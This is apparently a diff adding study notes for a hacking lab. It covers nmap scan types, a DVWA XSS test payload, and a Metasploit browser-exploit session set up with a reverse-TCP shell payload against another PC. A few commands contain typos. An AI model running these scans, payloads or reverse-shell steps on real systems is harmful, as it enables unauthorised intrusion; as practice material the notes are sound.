@@ -1,0 +1,57 @@
+ifconfig                    ipconfig
+ping google.com             ping
+netstat                     netstat          
+traceroute google.com       tracert www.google.com
+
+
+
+1) ACK -sA (TCP ACK scan) 
+It never determines open ports. It is used to map out firewall rulesets, determining 
+which ports are filtered 
+nmap -sA -T4 scanme.nmap.org
+
+2) SYN (Stealth) Scan (-sS) 
+SYN Scan is the default and most popular scan options for good reasons . It can be 
+performed quickly , scanning thousands of ports per second on a fast network not 
+hampered by intrusive firewalls 
+nmap -p22,113,139 scanme.nmap.org
+
+3) FIN (-sF) 
+Sets just the TCP FIN bit 
+nmap -sF -T4 scanme.name.org
+
+4) NULL Scan (-sN) 
+Does not set any bits (TCP Flag Header is 0) 
+nmap -sN -p 22 scanme.nmap.org
+
+5) XMAS Scan (-xS) 
+Sets the FIN, PSH and URG flags, lightning the packet up like a Christmas tree
+nmap -sX -T4 scanme.nmap.org
+
+
+
+https://github.com/digininja/DVWA
+
+http://localhost/dvwa/setup.php
+
+Message: 
+<script>alert("This is XSS Exploit test")</script> “sign the Guestbook” by submitting the form. 
+
+http://testphp.vulnweb.com/login.php
+
+
+msfconsole
+search tcp
+use exploit/multi/browser/msfd_rce_browser
+show -h options 
+set srvport 1243  #srvport => 1244 
+show options
+set ssl true
+show options
+show payloads
+set payload ruby/shell_reverse_tcp
+(ipconfig on others pc)
+set lhost 192.168.153.1
+show options 
+exploit 
+ls -a
